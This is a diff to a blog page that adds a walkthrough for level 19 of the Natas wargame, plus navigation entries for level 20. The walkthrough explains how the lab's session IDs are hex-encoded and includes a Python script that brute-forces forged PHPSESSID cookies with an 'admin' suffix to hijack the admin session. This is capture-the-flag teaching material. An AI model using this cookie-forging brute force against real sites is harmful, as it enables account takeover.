@@ -499,6 +499,24 @@ if (!doNotTrack) {
 					
 				
 			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#level-20" class="nav-level-20">
+									Level 20
+								</a>
+							</li>
+						
+						
+					
+				
+			
 		</ul>
 	</div>
 
@@ -918,6 +936,35 @@ for i in range(1, 640):
 </code></pre><p>Sure enough, one particular ID granted the password.</p>
 <hr>
 <h2 id="level-19">Level 19</h2>
+<p>Similarly, this level is looking for you to login using a PHPSESSID, but this time the IDs are &ldquo;not sequential&rdquo; according to the page.</p>
+<p>Clicking the login button with no credentials gives us a PHPSESSID of a seemingly random hex string always ending with 2d (a hyphen).</p>
+<p>After running a script to automate this hundreds of times I have confirmed that the same ID range is still in use&ndash;1 to 640. The id is simply converted to it&rsquo;s hex ascii value. So for example, instead of seeing 250, we see 3235302d.</p>
+<p>If we now login with a username, we get back a longer cookie. This time it will again be the same random id with a hyphen, but added onto the end is a hex ascii representation of the username typed in.</p>
+<p>Using a password does nothing, which tells me that the password is not implemented at all, most likely.</p>
+<p>So since we need to login as admin, we can be sure that the suffix of the cookie needs to be &ldquo;61646d696e&rdquo;. Then we can just try using all 640 possible values with the admin suffix added at the end until one of them works. Here&rsquo;s the script I used for that:</p>
+<pre><code>import requests
+
+url = &quot;http://natas19.natas.labs.overthewire.org&quot;
+credentials = (&quot;natas19&quot;, &quot;{censored}&quot;)
+form_data = {&quot;username&quot;: &quot;&quot;, &quot;password&quot;: &quot;&quot;}
+cookie_data = {&quot;PHPSESSID&quot;: &quot;x&quot;}
+  
+for i in range(1, 640):
+        # convert id to hex and append &quot;admin&quot; suffix
+        cookie_data[&quot;PHPSESSID&quot;] = &quot;&quot;
+        for j in str(i):
+              cookie_data[&quot;PHPSESSID&quot;] += hex(ord(j)).lstrip(&quot;0x&quot;)
+        cookie_data[&quot;PHPSESSID&quot;] += &quot;2d61646d696e&quot;
+        
+        response = requests.post(url, cookies=cookie_data, auth=credentials, data=form_data)
+        print(response.text)
+        print(&quot;guess:&quot;, i, &quot;|&quot;, cookie_data[&quot;PHPSESSID&quot;])
+
+        if &quot;You are logged in as a regular user.&quot; not in response.text:
+            break
+</code></pre><p>I was able to get the password to natas20 by running this script.</p>
+<hr>
+<h2 id="level-20">Level 20</h2>
 <p>(coming soon)</p>
 
                     
@@ -1405,6 +1452,24 @@ for i in range(1, 640):
 							<li>
 								<a href="#level-19" class="nav-level-19">
 									Level 19
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#level-20" class="nav-level-20">
+									Level 20
 								</a>
 							</li>
 						
